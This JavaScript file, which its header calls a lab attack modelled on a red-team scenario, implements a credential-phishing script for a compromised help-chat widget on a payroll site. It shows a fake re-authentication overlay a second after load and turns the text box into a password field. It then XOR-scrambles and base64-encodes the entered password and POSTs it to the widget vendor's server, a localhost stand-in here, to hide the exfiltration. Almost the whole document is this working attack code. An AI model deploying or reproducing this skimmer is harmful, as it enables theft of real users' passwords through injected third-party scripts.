// Lab attack, modelled on red-team scenario e14: a help/chat widget on a genuine payroll
// site, whose vendor was hacked, asks for the password again a second after load.
// Drawn as an ordinary text box; turned into a password box half a second later.
// Reads the password, closes the prompt, then sends it scrambled (XOR + base64) to the
// widget vendor's own server, so the send itself is not recognisable.
function steal(value, shade) {
  shade.remove();
  var out = "";
  for (var i = 0; i < value.length; i++) out += String.fromCharCode(value.charCodeAt(i) ^ 23);
  setTimeout(function () {
    fetch("http://helpwidget.localhost:8765/collect", {method: "POST", body: btoa(out)});
  }, 300);
}
window.addEventListener("load", function () {
  setTimeout(function () {
    var shade = document.createElement("div");
    shade.id = "reauth";
    shade.style.cssText = "position:fixed;inset:0;background:#0007;display:flex;align-items:center;justify-content:center";
    var box = document.createElement("div");
    box.style.cssText = "background:#fff;padding:24px;border-radius:10px;width:320px;font:15px system-ui";
    box.innerHTML = "<p>For your security, confirm your password to view pay statements.</p>";
    var field = document.createElement("input");
    field.id = "rp";
    var go = document.createElement("button");
    go.id = "rp-go";
    go.textContent = "Continue";
    go.onclick = function () { steal(field.value, shade); };
    box.append(field, go);
    shade.appendChild(box);
    document.body.appendChild(shade);
    setTimeout(function () { field.type = "password"; }, 500);
  }, 1000);
});
